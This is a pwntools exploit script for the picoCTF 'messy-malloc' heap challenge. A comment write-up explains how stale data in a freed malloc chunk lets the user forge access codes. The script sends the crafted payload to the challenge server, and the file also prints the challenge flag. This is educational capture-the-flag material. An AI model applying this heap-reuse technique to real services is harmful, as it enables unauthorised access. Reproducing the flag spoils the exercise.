#!/usr/bin/env python3

from pwn import *

exe = ELF("auth")
context.binary = exe
context.log_level = "debug"

############################### Write-Up ######################################
# Challenge: messy-malloc
# Category: Binary Exploitation
# Points: 300
# Description: Can you take advantage of misused malloc calls to leak the secret through this service and get the flag? Connect with nc 2019shell1.picoctf.com 49920. Source.
#
# Okay this works locally but no longer works remotely apparently so I
# coudn't get a flag. :( But here's the gist: only one user struct is
# made throughout the runthrough of the program, and it is made using
# malloc(). You can only change the username pointer using a "login"
# cmd, and a "logout" cmd uses free() to remove your data from the heap.
# Here's the catch: the vuln in this chall comes from how malloc()
# initiates a chunk from the heap. It does not clear out any of the data
# you put in before the chunk was free()'d. The program would have to
# call memset() to do that. The C funtion calloc() would automatically
# do that for you in its initiation. So, because I can "reuse" the data,
# all I have to do is make a username that includes the access codes that
# are to be stored, "logout" to free() the chunk so that the codes are set
# into the space in the user struct that they are meant to be in, and then
# "login" with a username that has <= 8 bytes so that I don't overwrite the
# codes. The reason why I have to log out and can't use the "print-flag" cmd
# to get the flag just yet is bc the access codes in the first session I make
# are only recognized as part of the username field. When I free it, it just
# becomes data that just becomes the access codes in the struct the second time
# I log in. From here, display-flag should spit you the flag.
#
#
# Solved by: Ryan Nguyen
# Flag: picoCTF{g0ttA_cl3aR_y0uR_m4110c3d_m3m0rY_ff982789} (from PicoGym)
###############################################################################

def conn():
	if False:
		return process([exe.path])
	else:
#		return remote("2019shell1.picoctf.com", 49920) 2019 Game version no longer works
		return remote("jupiter.challenges.picoctf.org", 1541)

def main():
	r = conn()
	r.recvuntil("> ")
	r.sendline("login")
	r.recvuntil("username")
	r.sendline("32") # Enough bytes to fill out the entire user struct
	ac1 = p64(0x4343415f544f4f52)
	ac2 = p64(0x45444f435f535345)
	payload = bytes("a"*8, 'utf-8') + bytes("ROOT_ACCESS_CODE", 'utf-8') + bytes("b"*8, 'utf-8') # a's for filling for username pointer, b's for filling for files pointer
	r.recvuntil("username")
	r.sendline(payload)
	r.recvuntil("> ")
	r.sendline("logout")
	r.recvuntil("> ")
	r.sendline("login")
	r.recvuntil("username")
	r.sendline("1") # rlly doesn't matter the size here, just as long as you don't overwrite your access codes
	r.recvuntil("username")
	r.sendline("d")
	r.recvuntil("> ")
	r.sendline("print-flag")
	r.interactive()


if __name__ == "__main__":
	main()
